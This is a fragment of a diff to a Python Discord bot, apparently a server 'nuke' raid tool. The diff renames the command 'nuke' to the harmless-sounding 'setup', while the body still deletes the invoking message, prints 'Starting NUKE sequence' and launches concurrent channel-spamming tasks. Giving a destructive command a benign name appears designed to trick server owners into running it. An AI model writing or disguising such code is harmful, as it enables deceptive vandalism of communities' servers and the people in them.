@@ -29,7 +29,7 @@ async def spam_channel(channel):
             break
 
 @bot.command()
-async def nuke(ctx):
+async def setup(ctx):
     await ctx.message.delete()
     guild = ctx.guild
     print("⚠️ Starting NUKE sequence...")
@@ -68,8 +68,6 @@ async def nuke(ctx):
     await asyncio.gather(*spam_tasks)
 
     print("✅ NUKE complete.")
-
-
 
 
 
